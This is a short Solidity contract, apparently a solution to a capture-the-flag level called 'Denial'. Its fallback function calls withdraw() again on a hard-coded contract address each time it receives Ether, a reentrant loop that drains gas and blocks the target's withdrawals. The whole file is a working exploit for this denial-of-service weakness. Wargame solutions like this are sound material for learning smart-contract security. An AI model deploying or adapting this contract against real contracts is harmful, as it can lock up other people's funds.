pragma solidity ^0.8.0;

contract DenialSolver {
    fallback() external payable {
        address(0x5cEbee35863e7Bf105a56910CaC278f031abfe0A).call{value: 0}(abi.encodeWithSignature("withdraw()"));
    }
}